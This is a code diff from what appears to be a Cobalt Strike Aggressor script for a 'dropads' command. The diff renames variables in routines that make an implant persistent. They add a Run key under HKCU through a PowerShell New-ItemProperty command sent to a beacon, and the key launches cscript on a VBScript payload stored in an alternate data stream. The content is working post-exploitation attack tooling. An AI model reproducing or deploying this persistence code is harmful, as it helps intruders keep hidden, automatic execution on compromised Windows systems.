@@ -85,20 +85,20 @@ alias dropads {
 
 
 	# build out the regkey
-        $hive = "HKCU";
-    	$keyPath = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
-	$keyName = "TEST";
-	$regPayload = "cmd /C $windir\\system32\\cscript.exe //E:vbscript $ads";
+        $Hive = "HKCU";
+    	$Path = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
+	$Name = "TEST";
+	$Payload = "cmd /C $windir\\system32\\cscript.exe //E:vbscript $ads";
 
 	# add the key
-    	addRegKey($1,$hive,$keyPath,$keyName,$regPayload);
+    	addRegKey($1,$Hive,$Path,$Name,$Payload);
 }
 
 sub addRegKey {
-	$hive,$keyPath,$keyName,$regPayload = @_ ;
-	$powershell = "New-ItemProperty -Force -Path \" $+ $hive $+ : $+ $keyPath $+ \" -Name \" $+ $keyName $+ \" -PropertyType String -Value \" $+ $regPayload $+ \"";
-	blog($powershell);
+	$kHive,$kPath,$kName,$kPayload = @_ ;
+	$powershell = "New-ItemProperty -Force -Path \" $+ $kHive $+ : $+ $kPath $+ \" -Name \" $+ $kName $+ \" -PropertyType String -Value \" $+ $kPayload $+ \"";
 	bpowershell($1, $powershell);
+	blog($1,$powershell);
 }
 
 sub remRegKey {
